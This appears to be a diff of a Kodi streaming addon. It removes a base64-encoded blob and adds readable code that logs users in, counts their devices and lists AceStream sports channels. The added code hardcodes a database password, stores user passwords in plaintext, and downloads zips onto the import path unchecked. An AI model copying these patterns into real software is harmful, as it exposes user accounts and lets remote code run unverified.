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'))
+# -*- coding: utf-8 -*-
+import sys
+import os
+import urllib.parse
+import re
+import shutil
+import zipfile
+import xbmcplugin
+import xbmcgui
+import xbmcvfs
+import xbmc
+import hashlib
+from datetime import datetime
+import json
+import uuid
+import requests
+
+def list_dependencies():
+    return [
+        {
+            "name": "requests",
+            "url": "https://tronoss99.github.io/repo/addons/dependencias/requests.zip"
+        },
+        {
+            "name": "mysql-connector-python",
+            "url": "https://tronoss99.github.io/repo/addons/dependencias/mysql-connector-python.zip"
+        }
+    ]
+
+def download_and_unzip_kodi(url, dependency_name, output_dir):
+    try:
+        temp_path = xbmcvfs.translatePath('special://temp/')
+        local_path = os.path.join(temp_path, f"{dependency_name}.zip")
+
+        xbmc.log(f"Descargando {dependency_name} desde {url}...", level=xbmc.LOGINFO)
+        response = requests.get(url, stream=True)
+        response.raise_for_status()
+
+        with open(local_path, 'wb') as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                f.write(chunk)
+
+        xbmc.log(f"Archivo descargado: {local_path}", level=xbmc.LOGINFO)
+
+        if zipfile.is_zipfile(local_path):
+            with zipfile.ZipFile(local_path, 'r') as zip_ref:
+                zip_ref.extractall(output_dir)
+            xbmc.log(f"Archivo {dependency_name} descomprimido en {output_dir}", level=xbmc.LOGINFO)
+        else:
+            xbmcgui.Dialog().notification("Error", "Archivo no soportado", xbmcgui.NOTIFICATION_ERROR)
+            return False
+
+        os.remove(local_path)
+        xbmc.log(f"Archivo temporal eliminado: {local_path}", level=xbmc.LOGINFO)
+        return True
+    except requests.exceptions.RequestException as e:
+        xbmcgui.Dialog().notification("Error", f"Error en la descarga: {e}", xbmcgui.NOTIFICATION_ERROR)
+        xbmc.log(f"Error en la descarga: {e}", level=xbmc.LOGERROR)
+        return False
+
+output_dir = xbmcvfs.translatePath('special://home/addons/plugin.video.tronosstv/resources/lib/')
+dependencies = list_dependencies()
+
+for dependency in dependencies:
+    dependency_folder = os.path.join(output_dir, dependency["name"])
+    if os.path.exists(dependency_folder):
+        sys.path.insert(0, dependency_folder)
+        xbmc.log(f"Ruta añadida para {dependency['name']}: {dependency_folder}", level=xbmc.LOGINFO)
+    else:
+        xbmc.log(f"No se encontró la dependencia {dependency['name']}. Intentando descargar...", level=xbmc.LOGINFO)
+        if download_and_unzip_kodi(dependency["url"], dependency["name"], output_dir):
+            sys.path.insert(0, dependency_folder)
+            xbmc.log(f"Dependencia {dependency['name']} instalada y ruta añadida.", level=xbmc.LOGINFO)
+        else:
+            xbmcgui.Dialog().notification("Error", f"No se pudo instalar la dependencia {dependency['name']}", xbmcgui.NOTIFICATION_ERROR)
+            xbmc.log(f"No se pudo instalar la dependencia {dependency['name']}.", level=xbmc.LOGERROR)
+            sys.exit(1)
+
+try:
+    import mysql.connector
+    xbmc.log("Módulo mysql.connector importado correctamente.", level=xbmc.LOGINFO)
+except ImportError as e:
+    xbmcgui.Dialog().notification("Error", f"No se pudo importar mysql.connector: {e}", xbmcgui.NOTIFICATION_ERROR)
+    xbmc.log(f"Error importando mysql.connector: {e}", level=xbmc.LOGERROR)
+    sys.exit(1)
+
+try:
+    import requests
+    xbmc.log("Módulo requests importado correctamente.", level=xbmc.LOGINFO)
+except ImportError as e:
+    xbmcgui.Dialog().notification("Error", f"No se pudo importar requests: {e}", xbmcgui.NOTIFICATION_ERROR)
+    xbmc.log(f"Error importando requests: {e}", level=xbmc.LOGERROR)
+    sys.exit(1)
+
+DB_HOST = "btu73hhmyjd94a9udngy-mysql.services.clever-cloud.com"
+DB_NAME = "btu73hhmyjd94a9udngy"
+DB_USER = "uuyxjmtlimnea2uo"
+DB_PASSWORD = "vfymuvMZIAXLks0xAyVQ"
+DB_PORT = 3306
+
+addon_handle = int(sys.argv[1])
+base_url = sys.argv[0]
+
+ICON_PATH = xbmcvfs.translatePath('special://home/addons/plugin.video.tronosstv/icono.png')
+FANART_PATH = xbmcvfs.translatePath('special://home/addons/plugin.video.tronosstv/resources/fanart.jpg')
+CREDENTIALS_FILE = xbmcvfs.translatePath('special://profile/addon_data/plugin.video.tronosstv/credentials.json')
+DEVICE_ID_FILE = xbmcvfs.translatePath('special://profile/addon_data/plugin.video.tronosstv/device_id.json')
+REMOTE_STATUS_URL = "https://raw.githubusercontent.com/tronoss99/repo/main/status.json"
+UPDATE_URL = "https://raw.githubusercontent.com/tronoss99/repo/main/main.py"
+DEPENDENCIES_URL = "https://tronoss99.github.io/repo/addons/dependencias"
+DEPENDENCIES_LIST = ["mysql-connector-python", "requests"]
+TARGET_DIRECTORY = xbmcvfs.translatePath('special://home/addons/plugin.video.tronosstv/resources/lib/')
+ACESTREAM_URL = "https://ipfs.io/ipns/elcano.top"
+EVENTS_URL = "http://141.145.210.168"
+
+user_id_global = None 
+is_logged_in = False 
+addon_active = False 
+device_marked_active = False
+current_device_id = None
+
+def connect_db():
+    try:
+        connection = mysql.connector.connect(
+            host=DB_HOST,
+            user=DB_USER,
+            password=DB_PASSWORD,
+            database=DB_NAME,
+            port=DB_PORT
+        )
+        return connection
+    except mysql.connector.Error as e:
+        xbmcgui.Dialog().notification("Error DB", f"No se pudo conectar: {e}", xbmcgui.NOTIFICATION_ERROR)
+        return None
+
+def to_utf8(text):
+    if isinstance(text, str):
+        return text.encode('utf-8', 'ignore').decode('utf-8')
+    return text
+
+def check_remote_status():
+    try:
+        response = requests.get(REMOTE_STATUS_URL)
+        if response.status_code == 200:
+            status_data = response.json()
+            if status_data.get("status") == "mantenimiento":
+                xbmcgui.Dialog().ok(
+                    to_utf8("Mantenimiento"),
+                    to_utf8(status_data.get("message", "El addon esta en mantenimiento."))
+                )
+                return False  
+        return True
+    except Exception as e:
+        xbmcgui.Dialog().notification(
+            to_utf8("Error"),
+            to_utf8(f"No se pudo verificar el estado remoto: {e}"),
+            xbmcgui.NOTIFICATION_ERROR
+        )
+        return True
+
+def save_credentials(username, password):
+    os.makedirs(os.path.dirname(CREDENTIALS_FILE), exist_ok=True)
+    credentials = {"username": username, "password": password}
+    with open(CREDENTIALS_FILE, 'w') as f:
+        json.dump(credentials, f)
+
+def load_credentials():
+    if os.path.exists(CREDENTIALS_FILE):
+        with open(CREDENTIALS_FILE, 'r') as f:
+            return json.load(f)
+    return None
+
+def prompt_for_credentials():
+    keyboard = xbmcgui.Dialog()
+    username = keyboard.input("Introduce el usuario", type=xbmcgui.INPUT_ALPHANUM)
+    if not username:
+        return None, None
+    password = keyboard.input("Introduce la contraseña", type=xbmcgui.INPUT_ALPHANUM, option=xbmcgui.PASSWORD_VERIFY)
+    if not password:
+        return None, None
+    return username, password
+
+def hash_password(password):
+    return hashlib.sha256(password.encode('utf-8')).hexdigest()
+
+def check_user(username, password):
+    connection = connect_db()
+    if not connection:
+        return None
+    cursor = connection.cursor(dictionary=True)
+    try:
+        query = "SELECT users.*, users.max_devices FROM users WHERE username = %s"
+        cursor.execute(query, (username,))
+        user = cursor.fetchone()
+        if user and hash_password(password) == user['password_hash']:
+            if user['active_devices'] >= user['max_devices']:
+                xbmcgui.Dialog().notification("Error", "Dispositivos máximos alcanzados", xbmcgui.NOTIFICATION_ERROR)
+                return None
+            return user
+        return None
+    finally:
+        cursor.close()
+        connection.close()
+
+def get_device_id():
+    global current_device_id
+    if current_device_id:  
+        return current_device_id
+    if os.path.exists(DEVICE_ID_FILE):
+        with open(DEVICE_ID_FILE, 'r') as f:
+            current_device_id = json.load(f).get("device_id")
+    else:
+        current_device_id = str(uuid.uuid4())
+        with open(DEVICE_ID_FILE, 'w') as f:
+            json.dump({"device_id": current_device_id}, f)
+    return current_device_id
+
+def update_active_devices(user_id, device_id, increment=True):
+    connection = connect_db()
+    if not connection:
+        xbmc.log("No se pudo conectar a la base de datos", level=xbmc.LOGERROR)
+        return False
+
+    cursor = connection.cursor()
+    try:
+        cursor.execute("SELECT device_id FROM users WHERE id = %s", (user_id,))
+        result = cursor.fetchone()
+        if not result:
+            xbmc.log("No se encontró el usuario en la base de datos", level=xbmc.LOGERROR)
+            return False
+
+        current_device_ids = result[0] if result[0] else ""
+        device_list = current_device_ids.split(",") if current_device_ids else []
+
+        if increment:
+            if device_id in device_list:
+                xbmc.log(f"Dispositivo ya activo: {device_id}", level=xbmc.LOGINFO)
+                return True
+
+            device_list.append(device_id)
+            updated_device_ids = ",".join(device_list)
+            query = "UPDATE users SET active_devices = active_devices + 1, device_id = %s WHERE id = %s"
+            cursor.execute(query, (updated_device_ids, user_id))
+
+        else:
+            if device_id not in device_list:
+                xbmc.log(f"El dispositivo {device_id} no está en la lista para el usuario {user_id}", level=xbmc.LOGINFO)
+                return True
+
+            device_list = [d for d in device_list if d != device_id]
+            updated_device_ids = ",".join(device_list)
+            query = "UPDATE users SET active_devices = active_devices - 1, device_id = %s WHERE id = %s"
+            cursor.execute(query, (updated_device_ids, user_id))
+
+        connection.commit()
+        xbmc.log(f"Dispositivos activos actualizados para usuario {user_id}: {updated_device_ids}", level=xbmc.LOGINFO)
+        return True
+
+    except Exception as e:
+        xbmc.log(f"Error en update_active_devices: {e}", level=xbmc.LOGERROR)
+        return False
+    finally:
+        cursor.close()
+        connection.close()
+
+       
+def get_page_content(url):
+    try:
+        response = requests.get(url)
+        response.encoding = 'utf-8'
+        if response.status_code == 200:
+            return response.text
+        else:
+            xbmcgui.Dialog().notification("Error", f"HTTP {response.status_code}", xbmcgui.NOTIFICATION_ERROR)
+            return ""
+    except Exception as e:
+        xbmcgui.Dialog().notification("Error", str(e), xbmcgui.NOTIFICATION_ERROR)
+        return ""
+
+def build_url(query):
+    return f"{base_url}?{urllib.parse.urlencode(query)}"
+
+def list_channels(user):
+    content = get_page_content(ACESTREAM_URL)
+    if not content:
+        xbmcplugin.endOfDirectory(addon_handle)
+        return
+
+    channels = extract_acestream_links(content)
+    if not channels:
+        xbmcgui.Dialog().notification("Error", "No se encontraron canales", xbmcgui.NOTIFICATION_WARNING)
+        xbmcplugin.endOfDirectory(addon_handle)
+        return
+
+    for name, channel_id in channels:
+        url = build_url({"action": "play", "id": channel_id}) if channel_id else ""
+        list_item = xbmcgui.ListItem(name)
+        list_item.setInfo("video", {"title": name})
+        list_item.setProperty("IsPlayable", "true")
+        list_item.setArt({
+            'icon': ICON_PATH,
+            'thumb': ICON_PATH,
+            'fanart': FANART_PATH
+        })
+        xbmcplugin.addDirectoryItem(handle=addon_handle, url=url, listitem=list_item, isFolder=False)
+
+    xbmcplugin.endOfDirectory(addon_handle)
+
+def extract_acestream_links(content):
+    channels = []
+    pattern_full = r'"name":\s*"([^"]+)".*?"url":\s*"acestream://([a-fA-F0-9]+)"'
+    matches_full = re.findall(pattern_full, content)
+    for name, channel_id in matches_full:
+        if '{' not in name and '}' not in name:  
+            channels.append((name.strip(), channel_id.strip()))
+    pattern_no_link = r'"name":\s*"([^"]+)"'
+    matches_no_link = re.findall(pattern_no_link, content)
+    for name in matches_no_link:
+        if '{' not in name and '}' not in name:  
+            if name not in [c[0] for c in channels]:
+                channels.append((name.strip(), ""))
+    lines = content.splitlines()
+    for line in lines:
+        line = line.strip()
+        if "acestream://" in line and not re.search(r'acestream://[a-fA-F0-9]+', line):
+            name_match = re.match(r'(.*?)\s*acestream://', line)
+            if name_match:
+                name = name_match.group(1).strip()
+                if '{' not in name and '}' not in name: 
+                    if name not in [c[0] for c in channels]:
+                        channels.append((name, ""))
+    return sorted(channels, key=lambda x: x[0].lower())
+
+def extract_acestream_events(content):
+    xbmc.log("Iniciando extracción de eventos", level=xbmc.LOGERROR)
+    events = []
+
+    row_pattern = r"<tr>(.*?)</tr>"
+    rows = re.findall(row_pattern, content, re.DOTALL)
+    xbmc.log(f"Filas encontradas: {len(rows)}", level=xbmc.LOGERROR)
+
+    for row in rows:
+        xbmc.log(f"Procesando fila: {row}", level=xbmc.LOGDEBUG)
+        columns = re.findall(r"<td>(.*?)</td>", row, re.DOTALL)
+        if len(columns) < 5:
+            xbmc.log("Fila inválida, se omite.", level=xbmc.LOGWARNING)
+            continue
+
+        time, competition, team1, team2, links = columns[:5]
+        xbmc.log(f"Datos extraídos: {time}, {competition}, {team1}, {team2}", level=xbmc.LOGERROR)
+
+        link_pattern = r"<a href=acestream://([a-fA-F0-9]+)>(.*?)</a>"
+        link_matches = re.findall(link_pattern, links)
+        for channel_id, channel_name in link_matches:
+            event = {
+                "time": time.strip(),
+                "competition": competition.strip(),
+                "teams": f"{team1.strip()} Vs {team2.strip()}",
+                "channel_name": channel_name.strip(),
+                "channel_id": channel_id.strip(),
+            }
+            events.append(event)
+
+    xbmc.log(f"Eventos extraídos: {len(events)}", level=xbmc.LOGERROR)
+    return events
+
+def list_acestream_events():
+    xbmc.log("Entrando en list_acestream_events", level=xbmc.LOGERROR)
+    content = get_page_content(EVENTS_URL)
+    if not content:
+        xbmc.log("No se pudo obtener contenido de la página.", level=xbmc.LOGERROR)
+        xbmcgui.Dialog().notification("Error", "No se pudo obtener contenido de la página.", xbmcgui.NOTIFICATION_ERROR)
+        xbmcplugin.endOfDirectory(addon_handle)
+        return
+    
+    events = extract_acestream_events(content)
+    if not events:
+        xbmc.log("No se encontraron eventos.", level=xbmc.LOGWARNING)
+        xbmcgui.Dialog().notification("Error", "No se encontraron eventos.", xbmcgui.NOTIFICATION_WARNING)
+        xbmcplugin.endOfDirectory(addon_handle)
+        return
+
+    for event in events:
+        url = build_url({"action": "play", "id": event["channel_id"]})
+        list_item = xbmcgui.ListItem(label=f"{event['time']} | {event['competition']} | {event['teams']}")
+        list_item.setInfo("video", {"title": event["channel_name"]})
+        list_item.setProperty("IsPlayable", "true")
+        list_item.setArt({
+            "icon": ICON_PATH,
+            "thumb": ICON_PATH,
+            "fanart": FANART_PATH
+        })
+
+        xbmcplugin.addDirectoryItem(handle=addon_handle, url=url, listitem=list_item, isFolder=False)
+
+    xbmc.log("Finalizando list_acestream_events", level=xbmc.LOGERROR)
+    xbmcplugin.endOfDirectory(addon_handle)
+
+def play_channel(channel_id):
+    if not channel_id:
+        xbmcgui.Dialog().notification("Error", "Canal sin ID disponible", xbmcgui.NOTIFICATION_ERROR)
+        return
+
+    horus_command = f'RunPlugin("plugin://script.module.horus/?action=play&id={channel_id}")'
+    try:
+        xbmc.executebuiltin(horus_command)
+        xbmcgui.Dialog().notification("Horus", "Reproduciendo en AceStream Engine...", xbmcgui.NOTIFICATION_INFO)
+    except Exception as e:
+        xbmcgui.Dialog().notification("Error", f"No se pudo ejecutar Horus: {e}", xbmcgui.NOTIFICATION_ERROR)
+
+def build_main_menu():
+    xbmc.executebuiltin('Container.SetViewMode(55)')
+
+    url_tronosstv = build_url({"action": "tronosstv"})
+    list_item_tronosstv = xbmcgui.ListItem(label="TronossTV")
+    list_item_tronosstv.setProperty("IsPlayable", "false")
+    list_item_tronosstv.setArt({'icon': '', 'thumb': ICON_PATH, 'fanart': FANART_PATH})
+    xbmcplugin.addDirectoryItem(handle=addon_handle, url=url_tronosstv, listitem=list_item_tronosstv, isFolder=True)
+
+    url_agendatronoss = build_url({"action": "agendatronoss"})
+    list_item_agendatronoss = xbmcgui.ListItem(label="Agenda Tronoss")
+    list_item_agendatronoss.setProperty("IsPlayable", "false")
+    list_item_agendatronoss.setArt({'icon': '', 'thumb': ICON_PATH, 'fanart': FANART_PATH})
+    xbmcplugin.addDirectoryItem(handle=addon_handle, url=url_agendatronoss, listitem=list_item_agendatronoss, isFolder=True)
+
+    xbmcplugin.endOfDirectory(addon_handle)
+
+def on_exit():
+    global user_id_global, is_logged_in, addon_active, device_marked_active, current_device_id
+
+    if user_id_global and is_logged_in and addon_active and device_marked_active:
+        xbmc.log(f"Reduciendo dispositivos activos para el usuario {user_id_global}", level=xbmc.LOGINFO)
+        success = update_active_devices(user_id_global, current_device_id, increment=False)
+        if success:
+            xbmc.log(f"Dispositivo {current_device_id} desactivado correctamente para el usuario {user_id_global}", level=xbmc.LOGINFO)
+        else:
+            xbmc.log(f"Error al desactivar el dispositivo {current_device_id} para el usuario {user_id_global}", level=xbmc.LOGERROR)
+
+    is_logged_in = False
+    addon_active = False
+    device_marked_active = False
+    current_device_id = None
+    xbmc.log("Estado de sesión limpiado correctamente.", level=xbmc.LOGINFO)
+
+def router(args):
+    global user_id_global, is_logged_in, addon_active, device_marked_active, current_device_id
+    action = args.get("action", [None])[0]
+    channel_id = args.get("id", [None])[0]
+
+    credentials = load_credentials()
+    user = None 
+
+    if credentials:
+        username = credentials['username']
+        password = credentials['password']
+        user = check_user(username, password)  
+        if not user: 
+            xbmcgui.Dialog().notification("Login requerido", "Credenciales inválidas. Por favor, inicie sesión nuevamente.", xbmcgui.NOTIFICATION_WARNING)
+            username, password = prompt_for_credentials()
+            if username and password:
+                user = check_user(username, password)
+                if user:
+                    save_credentials(username, password)
+    else:
+        username, password = prompt_for_credentials()
+        if username and password:
+            user = check_user(username, password)
+            if user:
+                save_credentials(username, password)
+
+    if user:
+        device_id = get_device_id()
+        if not device_marked_active:
+            if update_active_devices(user['id'], device_id, increment=True):
+                is_logged_in = True
+                user_id_global = user['id']
+                addon_active = True
+                device_marked_active = True
+    else:
+        xbmcgui.Dialog().notification("Error", "No se pudo autenticar al usuario.", xbmcgui.NOTIFICATION_ERROR)
+        xbmcplugin.endOfDirectory(addon_handle)
+        return
+
+    if action == "play" and channel_id:
+        play_channel(channel_id)
+    elif action == "tronosstv":
+        list_channels(user)
+    elif action == "agendatronoss":
+        list_acestream_events()
+    else:
+        build_main_menu()
+
+if __name__ == "__main__":
+    monitor = xbmc.Monitor()
+    if not check_remote_status():
+        sys.exit(0) 
+    try:
+        args = urllib.parse.parse_qs(sys.argv[2][1:])
+        router(args)
+    finally:
+        monitor.waitForAbort()
+        on_exit()
